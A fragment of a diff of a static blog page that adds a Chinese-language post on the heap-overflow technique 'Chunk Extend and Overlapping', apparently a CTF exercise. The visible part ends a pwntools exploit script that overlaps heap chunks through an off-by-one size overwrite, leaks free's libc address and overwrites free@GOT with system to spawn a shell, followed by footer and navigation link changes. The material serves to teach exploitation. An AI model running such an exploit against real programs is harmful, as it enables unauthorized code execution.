:'</span>)</span><br><span class="line">    gdb.attach(cn)</span><br><span class="line">    cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"><span class="comment">#leak free addr</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'cccc'</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#3</span></span><br><span class="line">gdb.attach(cn)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x81'</span>)</span><br><span class="line">gdb.attach(cn)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">size = <span class="string">'\x08'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload = <span class="string">'d'</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">'free'</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)<span class="comment">#1</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(cn.recvuntil(<span class="string">'Done'</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'free_addr = '</span>+str(hex(free_addr)))</span><br><span class="line"><span class="comment">#trim free_got</span></span><br><span class="line">system_addr = free_addr + lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'free'</span>]</span><br><span class="line">success(<span class="string">'system_addr = '</span>+str(hex(system_addr)))</span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<p>From <a href="https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/">https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/</a> bye</p>
 
         
                 <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
@@ -519,7 +547,7 @@
                             This blog is under a <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0 Unported License</a>
                         </strong>
                         <br>
-                        <strong>本文链接：</strong><a href="https://kabeor.github.io/吾爱破解培训第三课：改头换面之修改版权和资源/">https://kabeor.github.io/吾爱破解培训第三课：改头换面之修改版权和资源/</a>
+                        <strong>本文链接：</strong><a href="https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/">https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/</a>
                     </p>
                 </blockquote>
         
@@ -561,21 +589,13 @@
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/吾爱破解培训第九课：短兵相接--深入浅出探讨脱壳细节（下）/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/吾爱破解培训第七课：手把手教你从实例看如何攻破常见的网络验证/" id="post_nav-older" class="next-content">
+        <a href="/堆溢出-基本方法/" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
